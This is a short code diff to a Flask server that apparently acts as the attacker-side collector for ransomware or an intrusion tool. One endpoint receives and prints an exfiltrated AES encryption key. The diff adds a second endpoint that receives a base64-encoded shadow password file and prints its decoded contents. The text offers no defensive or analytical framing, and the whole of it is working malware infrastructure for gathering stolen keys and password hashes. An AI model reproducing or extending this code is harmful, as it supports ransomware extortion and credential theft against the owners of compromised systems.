@@ -22,12 +22,21 @@ def decode_key(aes_key_encoded_base64: str):
 def receive_key():
     data = request.get_json()
     aes_key_encoded_base64 = data.get('aes_key')
-    host_name = data.get('host_name')
-    user =  data.get('user')
 
     if aes_key_encoded_base64:
         aes_key = decode_key(aes_key_encoded_base64)
-        print(f"{user}@{host_name}: {binascii.hexlify(aes_key).decode()}")
+        print(f"key AES: {binascii.hexlify(aes_key).decode()}")
+        return '', 200
+    else:
+        return '', 400
+    
+@app.route('/shadow', methods=['POST'])
+def receive_shadow():
+
+    data = request.get_json(force=True)
+    base64_shadow_file = data.get('shadow')
+    if base64_shadow_file:
+        print(f"Shadow file:\n{base64.b64decode(base64_shadow_file).decode()}")
         return '', 200
     else:
         return '', 400
